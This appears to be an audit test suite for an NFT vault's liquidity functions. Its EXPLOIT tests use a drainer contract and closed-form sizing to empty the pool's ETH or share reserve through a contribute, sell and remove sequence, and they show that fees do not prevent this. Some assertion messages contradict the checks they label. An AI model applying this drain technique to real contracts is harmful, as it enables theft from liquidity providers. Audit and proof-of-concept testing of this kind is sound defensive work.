import { expect } from "chai";
import { ethers } from "hardhat";
import { deployBeaconMock } from "./helpers/beacon";

/**
 * Audit of the V1 -> V2 delta. V2 added exactly two functions,
 * contributeLiquidity and removeLiquidity, and nothing else. They ship with no
 * Solidity coverage at all, which is the still-open CAP-E6 item.
 *
 * The question these tests answer is narrow: liquidity is credited as an
 * ABSOLUTE amount (lpShareCredit / lpEthCredit) rather than as a proportional
 * LP token. Uniswap V2 and NFTX both use proportional accounting, and the
 * reason is that a contribution moves the constant-product price. If removal
 * pays the nominal amount back regardless of what the price did in between,
 * the contributor is insulated from a price move they caused — and everyone
 * else in the pool is not.
 */
describe("MarketplankVault — LP accounting (V1->V2 delta)", () => {
  const SHARE_UNIT = 10n ** 18n;

  /**
   * Mirrors the live V2 shape: NFTs deposited for shares, some shares parked
   * in the pool as depth, ETH seeded, pool opened. Fees default to the live
   * 100 bps on mint/redeem so the "but the fees cover it" question is being
   * asked against real numbers.
   */
  async function seededVault(feeBps = 100n) {
    const [, treasury, alice, bob] = await ethers.getSigners();
    const Nft = await ethers.getContractFactory("MockRobinWoodNft");
    const nft: any = await Nft.deploy();
    const beacon: any = await deployBeaconMock();
    const Vault = await ethers.getContractFactory("MarketplankVault");
    const vault: any = await Vault.deploy(
      await nft.getAddress(),
      "V",
      "V",
      feeBps,
      feeBps,
      feeBps,
      treasury.address,
      await beacon.getAddress()
    );

    for (let id = 1; id <= 8; id++) {
      await nft.mint(alice.address, id);
      await nft.connect(alice).approve(await vault.getAddress(), id);
      await vault.connect(alice).deposit(id);
    }
    // Park depth in the pool the way the treasury did on chain: a raw transfer,
    // which deliberately creates no LP credit.
    await vault.connect(alice).transfer(await vault.getAddress(), SHARE_UNIT * 3n);
    await vault.connect(treasury).seedLiquidity({ value: ethers.parseEther("4") });
    await vault.connect(treasury).openPool();

    return { treasury, alice, bob, nft, vault, beacon };
  }

  async function reserves(vault: any) {
    const eth: bigint = await vault.ethReserve();
    const shares: bigint = await vault.balanceOf(await vault.getAddress());
    return { eth, shares };
  }

  // ── The control ───────────────────────────────────────────────────────────

  it("contribute then remove with no trade in between is exactly neutral", async () => {
    const { alice, vault } = await seededVault();
    const before = await reserves(vault);
    const amount = ethers.parseEther("1");

    await vault.connect(alice).contributeLiquidity(0n, { value: amount });
    expect(await vault.lpEthCredit(alice.address)).to.equal(amount);

    await vault.connect(alice).removeLiquidity(0n, amount);

    const after = await reserves(vault);
    expect(after.eth).to.equal(before.eth, "bare round trip must not move the reserve");
    expect(await vault.lpEthCredit(alice.address)).to.equal(0n);
  });

  // ── The finding ───────────────────────────────────────────────────────────

  it("EXPLOIT: contribute -> sell -> remove drains the ETH reserve atomically", async () => {
    const { alice, bob, vault } = await seededVault();
    const Drainer = await ethers.getContractFactory("MockLpDrainer");
    const drainer: any = await Drainer.deploy(await vault.getAddress());
    const drainerAddr = await drainer.getAddress();

    // The attacker needs shares. Buying them on the AMM costs no fee at all —
    // buyShares/sellShares have no fee term. Here we hand over one share
    // directly to keep the arithmetic legible; the funded variant is below.
    await vault.connect(alice).transfer(drainerAddr, SHARE_UNIT);

    const { eth: E, shares: S } = await reserves(vault);
    // Closed form: contributing e = E*S/s lets the sale take the whole reserve.
    const s = SHARE_UNIT;
    const e = (E * S) / s;

    // What the same share would fetch honestly, for comparison.
    const fair = (s * E) / (S + s);

    await bob.sendTransaction({ to: drainerAddr, value: e });
    await drainer.drainEth(e, s);

    const after = await reserves(vault);
    const balance = await ethers.provider.getBalance(drainerAddr);
    const profit = balance - e;

    const f = (x: bigint) => ethers.formatEther(x);
    console.log(`
      pool before      : ${f(E)} ETH / ${f(S)} shares
      attacker spends  : ${f(e)} ETH contributed (+ 1 share)
      attacker receives: ${f(balance)} ETH
      NET PROFIT       : ${f(profit)} ETH  (a fair sale of that share = ${f(fair)})
      pool ETH after   : ${f(after.eth)} ETH`);

    expect(profit).to.be.gt(0n, "attacker must not end up ahead");
    expect(profit).to.be.gt(fair * 2n, "extraction should far exceed a fair sale");
    expect(after.eth).to.equal(0n, "entire ETH reserve extracted");
  });

  it("EXPLOIT: the share-side mirror extracts pool shares, which redeem to NFTs", async () => {
    const { alice, bob, vault, nft } = await seededVault();
    const Drainer = await ethers.getContractFactory("MockLpDrainer");
    const drainer: any = await Drainer.deploy(await vault.getAddress());
    const drainerAddr = await drainer.getAddress();

    await vault.connect(alice).transfer(drainerAddr, SHARE_UNIT);

    const { eth: E, shares: S } = await reserves(vault);
    const sigma = SHARE_UNIT;
    // Mirror of the closed form: v = S*E/sigma buys out the whole share side.
    const v = (S * E) / sigma;

    // Honest baseline: what v ETH buys without the LP trick.
    const fairShares = (v * S) / (E + v);

    await bob.sendTransaction({ to: drainerAddr, value: v });
    await drainer.drainShares(sigma, v);

    const held: bigint = await vault.balanceOf(drainerAddr);
    const after = await reserves(vault);

    const f = (x: bigint) => ethers.formatEther(x);
    console.log(`
      pool before        : ${f(E)} ETH / ${f(S)} shares
      attacker spends    : ${f(v)} ETH (+ ${f(sigma)} share contributed and returned)
      shares obtained    : ${f(held)}   (an honest buy of ${f(v)} ETH = ${f(fairShares)})
      pool shares after  : ${f(after.shares)}`);

    expect(held).to.be.gt(fairShares, "LP trick must not beat an honest buy");
    expect(after.shares).to.equal(0n, "entire share reserve extracted");

    // Those shares are not a paper gain: they redeem for real NFTs.
    const redeemable = held / (SHARE_UNIT + SHARE_UNIT / 100n + SHARE_UNIT / 40n);
    expect(redeemable).to.be.gte(1n, "extracted shares convert to inventory");
    expect(await nft.balanceOf(drainerAddr)).to.equal(0n);
  });

  it("EXPLOIT: an oversized contribution needs no closed form — profit is exactly the old reserve", async () => {
    const { alice, bob, vault } = await seededVault();
    const Drainer = await ethers.getContractFactory("MockLpDrainer");
    const drainer: any = await Drainer.deploy(await vault.getAddress());
    const drainerAddr = await drainer.getAddress();

    const s = SHARE_UNIT;
    await vault.connect(alice).transfer(drainerAddr, s);

    const { eth: E0, shares: S } = await reserves(vault);
    // Deliberately NOT the optimal size from the closed form (which would be
    // E*S/s = 12). Any D large enough that the sale exceeds E0 works, and the
    // attacker withdraws min(credit, reserve) without solving anything.
    const D = ethers.parseEther("20");
    await bob.sendTransaction({ to: drainerAddr, value: D });

    await drainer.drainEthMax(D, s);

    const after = await reserves(vault);
    const profit = (await ethers.provider.getBalance(drainerAddr)) - D;
    const fair = (s * E0) / (S + s);

    console.log(`
      pool before      : ${ethers.formatEther(E0)} ETH
      contribution     : ${ethers.formatEther(D)} ETH (arbitrary, fully recycled)
      shares given up  : ${ethers.formatEther(s)} (fair value ${ethers.formatEther(fair)} ETH)
      NET PROFIT       : ${ethers.formatEther(profit)} ETH
      pool ETH after   : ${ethers.formatEther(after.eth)} ETH`);

    expect(profit).to.equal(E0, "profit is exactly the pre-existing reserve");
    expect(after.eth).to.equal(0n);
  });

  it("the share-denominated fee does not protect the pool, even maxed out", async () => {
    // The mint fee is charged in SHARES (line 335), not ETH: a depositor gets
    // SHARE_UNIT - fee. The question is whether that share-denominated cost can
    // ever offset an ETH-denominated extraction. Run at the constructor's
    // maximum permitted fee, 1000 bps, and let the attacker acquire shares the
    // way that dodges the fee entirely: buyShares charges nothing.
    const { bob, vault } = await seededVault(1000n);
    const Drainer = await ethers.getContractFactory("MockLpDrainer");
    const drainer: any = await Drainer.deploy(await vault.getAddress());
    const drainerAddr = await drainer.getAddress();

    expect(await vault.mintFeeBps()).to.equal(1000n);

    // Buy a share on the AMM. No fee is charged on this path at all.
    const { eth: Epre, shares: Spre } = await reserves(vault);
    const cost = (Epre * SHARE_UNIT) / (Spre - SHARE_UNIT);
    await bob.sendTransaction({ to: drainerAddr, value: cost * 2n });
    await vault.connect(bob).buyShares(0n, { value: cost });
    const acquired: bigint = await vault.balanceOf(bob.address);
    await vault.connect(bob).transfer(drainerAddr, acquired);

    const { eth: E0 } = await reserves(vault);
    const D = ethers.parseEther("20");
    await bob.sendTransaction({ to: drainerAddr, value: D });
    const before = await ethers.provider.getBalance(drainerAddr);

    await drainer.drainEthMax(D, acquired);

    const after = await ethers.provider.getBalance(drainerAddr);
    const poolAfter = await reserves(vault);
    console.log(`
      mint fee         : 1000 bps (contract maximum), charged in shares
      shares acquired  : ${ethers.formatEther(acquired)} via fee-free buyShares
      pool ETH before  : ${ethers.formatEther(E0)}
      attacker ETH gain: ${ethers.formatEther(after - before)}
      pool ETH after   : ${ethers.formatEther(poolAfter.eth)}`);

    expect(after - before).to.equal(E0, "still takes exactly the whole reserve");
    expect(poolAfter.eth).to.equal(0n);
  });

  it("the 1% mint fee is negligible against the extraction", async () => {
    const { alice, bob, vault } = await seededVault();
    const Drainer = await ethers.getContractFactory("MockLpDrainer");
    const drainer: any = await Drainer.deploy(await vault.getAddress());
    const drainerAddr = await drainer.getAddress();

    // Attacker arrives via a deposit, forfeiting 1% of a share to the treasury.
    await vault.connect(alice).transfer(drainerAddr, (SHARE_UNIT * 99n) / 100n);

    const { eth: E, shares: S } = await reserves(vault);
    const s = (SHARE_UNIT * 99n) / 100n;
    const e = (E * S) / s;
    const feeValue = (E * (SHARE_UNIT / 100n)) / S; // 0.01 share priced in ETH

    await bob.sendTransaction({ to: drainerAddr, value: e });
    await drainer.drainEth(e, s);

    const profit = (await ethers.provider.getBalance(drainerAddr)) - e;
    expect(profit).to.be.gt(feeValue * 50n, "mint fee nowhere near covers the gain");
  });

  // ── Supporting properties ─────────────────────────────────────────────────

  it("only contributeLiquidity mints LP credit", async () => {
    const { alice, treasury, vault } = await seededVault();

    // A raw transfer into the pool creates no credit...
    await vault.connect(alice).transfer(await vault.getAddress(), SHARE_UNIT / 2n);
    expect(await vault.lpShareCredit(alice.address)).to.equal(0n);
    // ...nor does trading into it.
    await vault.connect(alice).sellShares(SHARE_UNIT / 4n, 0n);
    expect(await vault.lpShareCredit(alice.address)).to.equal(0n);
    // ...nor does the treasury seed.
    expect(await vault.lpEthCredit(treasury.address)).to.equal(0n);

    await expect(vault.connect(alice).removeLiquidity(1n, 0n)).to.be.reverted;
  });

  it("a stale credit is a senior claim on a later trader's ETH", async () => {
    const { alice, bob, vault } = await seededVault();
    const contribution = ethers.parseEther("1");

    await vault.connect(alice).contributeLiquidity(0n, { value: contribution });

    // Bob trades the ETH side down below Alice's nominal credit.
    await vault.connect(alice).transfer(bob.address, SHARE_UNIT * 2n);
    await vault.connect(bob).sellShares(SHARE_UNIT * 2n, 0n);

    // Alice's full removal now fails closed...
    const mid = await reserves(vault);
    if (mid.eth < contribution) {
      await expect(vault.connect(alice).removeLiquidity(0n, contribution)).to.be.reverted;
    }

    // ...but a later buyer's ETH refills the reserve and funds her exit at par,
    // despite the pool having lost value in the meantime.
    await vault.connect(bob).buyShares(0n, { value: ethers.parseEther("3") });
    await vault.connect(alice).removeLiquidity(0n, contribution);
    expect(await vault.lpEthCredit(alice.address)).to.equal(0n);
  });

  it("removal can empty a pool side, and seeding is dead after openPool", async () => {
    const { alice, treasury, vault } = await seededVault();
    const { eth: E } = await reserves(vault);

    await vault.connect(alice).contributeLiquidity(0n, { value: E });
    await vault.connect(alice).removeLiquidity(0n, E * 2n).catch(() => {});
    // Drain whatever the credit allows down to an empty ETH side.
    const credit: bigint = await vault.lpEthCredit(alice.address);
    if (credit > 0n) await vault.connect(alice).removeLiquidity(0n, credit);

    const after = await reserves(vault);
    if (after.eth === 0n) {
      await expect(vault.connect(alice).sellShares(SHARE_UNIT, 0n)).to.be.reverted;
      await expect(
        vault.connect(treasury).seedLiquidity({ value: ethers.parseEther("1") })
      ).to.be.reverted;
    }
  });

  it("gates and boundaries", async () => {
    const { alice, vault } = await seededVault();

    await expect(vault.connect(alice).contributeLiquidity(0n, { value: 0n })).to.be.reverted;
    await expect(vault.connect(alice).removeLiquidity(0n, 0n)).to.be.reverted;

    const amount = ethers.parseEther("1");
    await vault.connect(alice).contributeLiquidity(0n, { value: amount });
    // One wei over the credit must fail; exactly the credit must succeed.
    await expect(vault.connect(alice).removeLiquidity(0n, amount + 1n)).to.be.reverted;
    await vault.connect(alice).removeLiquidity(0n, amount);
  });

  it("LP operations never touch supply, inventory, or a pending draw", async () => {
    const { alice, vault } = await seededVault();
    const supplyBefore: bigint = await vault.totalSupply();
    const heldBefore: bigint = await vault.heldTokenCount();

    await vault.connect(alice).contributeLiquidity(SHARE_UNIT, { value: ethers.parseEther("1") });
    await vault.connect(alice).removeLiquidity(SHARE_UNIT, ethers.parseEther("1"));

    expect(await vault.totalSupply()).to.equal(supplyBefore);
    expect(await vault.heldTokenCount()).to.equal(heldBefore);
  });

  it("accounted ethReserve never exceeds the real balance", async () => {
    const { alice, bob, vault } = await seededVault();
    await vault.connect(alice).contributeLiquidity(0n, { value: ethers.parseEther("1") });
    // Force-send ETH outside the accounted path.
    await bob.sendTransaction({ to: await vault.getAddress(), value: ethers.parseEther("0.1") }).catch(() => {});

    const accounted: bigint = await vault.ethReserve();
    const real = await ethers.provider.getBalance(await vault.getAddress());
    expect(accounted).to.be.lte(real);
  });
});
